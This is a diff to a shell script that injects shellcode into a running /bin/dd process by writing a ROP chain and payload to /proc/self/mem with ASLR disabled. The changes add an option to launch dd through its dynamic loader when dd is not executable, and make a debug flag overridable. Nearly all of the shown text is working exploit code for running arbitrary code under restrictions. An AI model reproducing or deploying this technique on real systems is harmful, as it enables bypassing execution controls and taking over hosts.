@@ -4,7 +4,11 @@ filename=/bin/dd
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
-DEBUG=0
+if [ -z "$DEBUG" ]; then DEBUG=0; fi
+
+# If /bin/dd is not executable by your user you may try to run it through the
+# the loader (typically ld).
+if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi
 
 # Endian conversion
 endian()
@@ -268,20 +272,19 @@ sc_len=$((${#sc} / 2))
 sc_len=$(printf %016x $sc_len)
 
 
-# dd's mappings
-dd_maps=$(linux64 -R $filename if=/proc/self/maps 2> /dev/null)
-# Where is the dd binary loaded without ASLR
-dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
-              head -n1 | cut -d'-' -f1)
-
 # Which interpreter (loader) does this dd need?
 interp_off=$(search_section file $filename .interp)
 interp_size=$(echo $interp_off | cut -d' ' -f2)
 interp_off=$(echo $interp_off | cut -d' ' -f1)
-interp=$(tail -c +$(($interp_off + 1)) $filename |\
-         head -c $((interp_size - 1)))
-interp_addr=$((interp_off + $((0x$dd_base))))
-interp_addr=$(printf %016x $interp_addr)
+interp=$(tail -c +$(($interp_off + 1)) $filename | head -c $((interp_size - 1)))
+if [ $USE_INTERP -eq 1 ]; then interp_=$interp; else interp_=""; fi
+
+# dd's mappings
+dd_maps=$($noaslr $interp_ $filename if=/proc/self/maps 2> /dev/null)
+# Where is the dd binary loaded without ASLR
+dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
+              head -n1 | cut -d'-' -f1)
+interp_addr=$(printf %016x $((interp_off + $((0x$dd_base)))))
 
 # Find path to the libc
 libc_path=$(LD_TRACE_LOADED_OBJECTS=1 $filename < /dev/null 2> /dev/null)
@@ -317,5 +320,5 @@ write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
 payload=$(printf %s "$rop$sc" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
 printf '%b' "$payload" |\
-(sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
+(sleep .1; $noaslr env -i $interp_ $filename bs=$rop_len count=1 of=/proc/self/mem \
 seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
